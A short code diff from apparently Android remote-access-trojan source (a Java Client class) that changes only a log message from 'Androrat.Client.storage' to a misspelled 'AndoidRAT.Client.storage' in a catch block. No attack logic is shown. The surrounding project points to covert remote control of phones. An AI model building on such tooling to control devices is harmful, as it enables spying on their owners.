@@ -286,7 +286,7 @@ public class Client extends ClientListener implements Controler {
 		}
 		catch(Exception e)
 		{
-			System.out.println("Androrat.Client.storage : pas une commande");
+			System.out.println("AndoidRAT.Client.storage : pas une commande");
 		}		
 	}
 }
